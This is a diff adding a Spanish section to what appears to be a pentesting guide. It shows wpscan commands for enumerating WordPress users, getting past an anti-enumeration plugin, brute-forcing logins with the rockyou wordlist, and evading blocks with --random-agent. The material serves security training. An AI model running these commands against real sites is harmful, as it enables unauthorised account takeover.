@@ -1080,6 +1080,30 @@ En caso de que la web principal del gestor de contenido se encuentre en otra rut
 wpscan -u "http://192.168.1.x" --wp-content-dir "directorio-wordpress"
 ```
 
+En ocasiones, podremos enumerar los usuarios existentes sobre el gestor, empleando para ello la siguiente sintaxis:
+
+```bash
+wpscan -u "http://192.168.1.x" --enumerate u
+```
+
+En caso de que el gestor de contenidos cuente con un plugin que bloquee la enumeración de usuarios, podemos hacer uso de la utilidad **stop_user_enumeration_bypass.rb** de _wpscan_ (/usr/share/wpscan/stop_user_enumeration_bypass.rb). La sintaxis sería la siguiente:
+
+```bash
+$~ ruby stop_user_enumeration_bypass.rb http://192.168.1.x
+```
+
+Tras obtener usuarios válidos de autenticación, podemos probar a realizar a un ataque de fuerza bruta haciendo uso de la siguiente sintaxis:
+
+```bash
+$~ wpscan -u "http://192.168.1.x" --username usuario -w /usr/share/wordlists/rockyou.txt
+```
+
+Una forma de bypassear posibles bloqueos es jugar con el parámetro **--random-agent**, de la siguiente forma:
+
+```bash
+$~ wpscan -u "http://192.168.1.x" --username usuario -w /usr/share/wordlists/rockyou.txt --random-agent
+```
+
 ### Pentesting Linux
 
 ### Pentesting Windows
